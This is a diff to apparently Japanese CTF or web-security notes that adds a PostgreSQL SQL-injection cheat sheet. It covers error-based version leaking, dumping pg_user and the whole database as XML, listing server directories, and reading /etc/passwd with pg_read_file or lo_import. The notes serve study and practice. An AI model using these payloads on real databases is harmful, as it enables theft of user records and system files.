@@ -51,6 +51,21 @@ Injection系はevalを探す。
 ## キーワード
 ### MySQL
 - `SELECT 'Ä'='a'`はTrueとなる。  
+### PostgreSQL
+- `select (CASE WHEN ((SELECT CAST(CHR(32)||(SELECT version()) AS NUMERIC))='1') THEN 2 ELSE 3 END)`  
+で以下のようなError文に結果が含まれた出力を返す。  
+```txt
+22P02 invalid input syntax for type numeric: " PostgreSQL 12.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.3.1 20191121 (Red Hat 8.3.1-5), 64-bit"
+```
+- `select query_to_xml('select * from pg_user',true,true,'');`  
+でXML形式で出力を返す。  
+- `select database_to_xml(true,true,'');`  
+でデータベース全体を返す。  
+- `select pg_ls_dir('.');`  
+データベースのカレントディレクトリ`/var/lib/postgresql/10/main`下のファイル一覧を返す。絶対パスや`../`は見れないようになっているが、最新版だとUserの権限によっては見れるようになってる？ 
+- `select pg_read_file('/etc/passwd');`  
+絶対パスを含むこれは`ERROR:  absolute path not allowed`というエラーになるが最新版では成功することもあるとか？このやり方では絶対パスのファイルは読めないが、largeobjectを使って`lo_import`なら絶対パスでも読み込める！  
+
 ### Node.js
 `eval`,`eval(`,`html`,`escape`,`new Buffer(`,`unserialize`,`node-serialize`,`deserialize`,`new Function`   
 ### Java Deserialization
